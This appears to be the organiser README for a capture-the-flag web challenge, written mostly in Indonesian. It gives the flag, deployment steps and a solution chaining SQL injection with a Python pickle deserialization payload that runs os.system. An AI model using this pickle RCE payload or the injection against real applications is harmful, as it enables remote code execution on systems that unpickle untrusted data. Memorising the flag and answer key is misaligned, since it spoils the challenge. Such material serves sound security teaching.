
# Web_CP_Merchandise_Medium

Author: Ismail Hakim - twang#7040

Descriptions: Konser yang ditunggu-tunggu hampir tiba. So we pickled everything into the shop !

# Untuk Panitia

Flag: FindITCTF{rC3_Deser1al_1z4t10n}

Deployment steps: 

```python
cd web_cp_merchandise
./dockerbuild.sh
```

Solving steps:

1. Peserta menemukan SQL injection pada web/view/1 dengan melakukan injeksi web/view/1`
2. Peserta mendapatkan hint dari deskripsi bahwa web menggunakan pickle. Terdapat celah Pickle RCE
3. solve.py

```python
import pickle
import base64
import os

payload = 'cp flag.txt application/static/.'

class RCE:
    def __reduce__(self):
        return os.system, (payload,)

if __name__ == '__main__':
    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))
```

1. SQL injection: `http://web/view/' UNION SELECT '<Pickle_Payload>`
2. Flag akan dapat diakses pada pada `http://web/static/flag.txt`

# Untuk Peserta

Nama Problem:

Deskripsi singkat: : Konser yang ditunggu-tunggu hampir tiba. So we pickled everything into the shop !

Hint (jika perlu): Lokasi flag pada flag.txt
